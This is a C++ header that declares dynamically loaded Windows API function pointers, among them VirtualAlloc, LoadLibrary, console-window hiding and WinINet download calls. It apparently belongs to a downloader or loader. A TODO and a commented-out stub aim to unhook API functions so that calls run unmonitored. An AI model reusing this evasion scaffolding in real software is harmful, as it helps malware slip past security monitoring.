/*
API functions are dynamically imported using LoadLibrary (no lib linking)
*/

#ifndef _API_H_
	#define _API_H_

#include "Defines.h"

// TODO: Unhook functions (http://jbremer.org/x86-api-hooking-demystified/)
// This unhooking would be used in API.cpp to make sure the function addresses
// that are found are legit and usable without being monitored :)
/*void * unhook(void * function)
{
	unsigned char *addr = (unsigned char *)function;

	// Skip over no-op prepending
	while (*addr == 0x90) addr++;

	// Op code for jmp instruction detection
	if (*addr == 0xe9) {

	}

	// Op code for push -> retn
	if (*addr == 0x68 && addr[5] == 0xc3) {
		
	}

	return function;
}*/

class API{
public:
	API(void);
	~API(void);

	//Kernel32.dll - function prototype typedefs
	typedef LPVOID(WINAPI *zHeapAlloc)					(HANDLE hHeap, DWORD dwFlags, SIZE_T dwBytes);
	typedef BOOL(WINAPI * zHeapFree)					(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
	typedef HANDLE(WINAPI * zGetProcessHeap)			(void);
	typedef HMODULE(WINAPI *zLoadLibraryA)				(LPCSTR lpFileName);
	typedef BOOL(WINAPI * zFreeLibrary)					(HMODULE hModule);
	typedef FARPROC(WINAPI *zGetProcAddress)			(HMODULE hModule, LPCSTR lpProcName);
	typedef LPVOID(WINAPI *zVirtualAlloc)				(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
	typedef BOOL(WINAPI *zVirtualFree)					(LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);
	typedef BOOL(WINAPI *zShowWindow)					(HWND hWnd, int nCmdShow);
	typedef HWND(WINAPI *zGetConsoleWindow)				(void);

	//User32.dll - function prototype typedefs
	typedef BOOL(WINAPI *zShowWindow)					(HWND hWnd, int nCmdShow);

	//Wininet.dll - function prototype typedefs
	typedef HINTERNET(WINAPI *zInternetOpenA)			(LPCSTR lpszAgent, DWORD dwAccessType, LPCSTR lpszProxyName, LPCSTR lpszProxyBypass, DWORD dwFlags);
	typedef HINTERNET(WINAPI *zInternetOpenUrlA)		(HINTERNET hInternet, LPCSTR lpszUrl, LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags, DWORD_PTR dwContext);
	typedef BOOL(WINAPI *zInternetQueryDataAvailable)	(HINTERNET hFile, LPDWORD lpdwNumberOfBytesAvailable, DWORD dwFlags, DWORD_PTR dwContext);
	typedef BOOL(WINAPI *zInternetReadFile)				(HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfByesToRead, LPDWORD lpdwNumberOfBytesRead);
	typedef BOOL(WINAPI *zInternetCloseHandle)			(HINTERNET hInternet);

	//Kernel32.dll - function pointers
	zHeapAlloc					HeapAlloc;
	zHeapFree					HeapFree;
	zGetProcessHeap				GetProcessHeap;
	zLoadLibraryA				LoadLibraryA;
	zFreeLibrary				FreeLibrary;
	zGetProcAddress				GetProcAddress;
	zVirtualAlloc				VirtualAlloc;
	zVirtualFree				VirtualFree;
	zGetConsoleWindow			GetConsoleWindow;

	//User32.dll - function pointers
	zShowWindow					ShowWindow;

	//Wininet.dll - function pointers
	zInternetOpenA				InternetOpenA;
	zInternetOpenUrlA			InternetOpenUrlA;
	zInternetQueryDataAvailable	InternetQueryDataAvailable;
	zInternetReadFile			InternetReadFile;
	zInternetCloseHandle		InternetCloseHandle;

	//Modules loaded by the API class
	HMODULE hKernel, hUser, hWininet;
};

#endif